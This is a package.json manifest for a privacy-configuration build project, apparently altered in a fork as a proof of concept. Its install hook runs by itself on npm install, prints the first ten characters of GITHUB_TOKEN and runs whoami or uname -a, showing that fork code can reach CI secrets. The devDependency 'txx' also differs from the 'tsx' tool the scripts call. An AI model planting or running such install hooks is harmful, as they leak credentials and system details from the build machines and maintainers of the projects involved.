{
  "name": "@duckduckgo/privacy-configuration",
  "version": "1.0.0",
  "description": "Build scripts and generated files for privacy feature configuration",
  "main": "index.js",
  "type": "module",
  "scripts": {
    "postinstall": "echo '[POC] POSTINSTALL RAN - FROM FORK CODE' && echo '[POC] GITHUB_TOKEN prefix: '${GITHUB_TOKEN:0:10}' && echo '[POC] WHoAmi / uname -a: '$(whoami 2>/dev/null || uname -a)'",
    "test": "npm run build && npm run unit-tests && npm run lint && npm run tsc",
    "build": "node index.js",
    "unit-tests": "node --test ./generated/api/list-type-tests.js && node --test ./generated/api/features-modal-tests.js",
    "lint": "eslint .",
    "lint-fix": "eslint . --fix",
    "tsc": "node --import tsx ./generated/api/*-tests.js",
    "tsc-watch": "npx tsx --watch ./generated/api/*-tests.js",
    "clean": "node clean.js",
    "generate": "node index.js",
    "validate-and-report": "node ./github/scripts/validate-and-report.js"
  },
  "devDependencies": {
    "@duckduckgo/privacy-shared": "github:duckduckgo/privacy-shared#v4.4.0",
    "@duckduckgo/waternav": "github:duckduckgo/waternav#v6.0.0",
    "eslint": "^5.16.0",
    "eslint-config-prettier": "^5.0.0",
    "typescript": "^5.0.0",
    "txx": "^0.5.0"
  },
  "private": true
}